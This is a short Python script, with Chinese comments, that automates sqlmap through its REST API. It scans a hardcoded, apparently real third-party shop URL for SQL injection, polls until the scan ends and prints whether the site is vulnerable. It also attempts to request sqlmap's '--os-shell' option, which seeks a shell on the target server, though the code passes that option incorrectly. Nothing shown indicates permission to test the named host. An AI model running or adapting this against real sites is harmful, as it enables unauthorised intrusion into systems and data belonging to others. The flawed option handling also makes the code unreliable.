import requests
import json
import time
#这个类实现一个最简单的方法->给我一个url，我给你检测是否存在sql注入
url_set = ''
if __name__=='__main__':
    url = 'http://shop.bjrcb.com/goodsinfo.xpt?id=113030'
    data = requests.get('http://localhost:8775/task/new').json()
    if data['success']:
        taskID = data['taskid']
        r = requests.post('http://localhost:8775/scan/%s/start'%taskID,data=json.dumps({'url':url},{'--os-shell'}),headers={'Content-Type':'application/json'})
        while(1):
            data = requests.get('http://localhost:8775/scan/%s/status'%taskID).json()
            print(data)
            if data['status']=='terminated':
                res = requests.get('http://localhost:8775/scan/%s/data'%taskID).json()['data']
                print(res)
                if not res==[]: #data非空，存在sql注入
                    print('经过sqlmap检查，这个url存在sql注入！')
                    break
                else:
                    print('经过sqlmap检查，这个url不存在sql注入')
                    break
            else:
                time.sleep(10)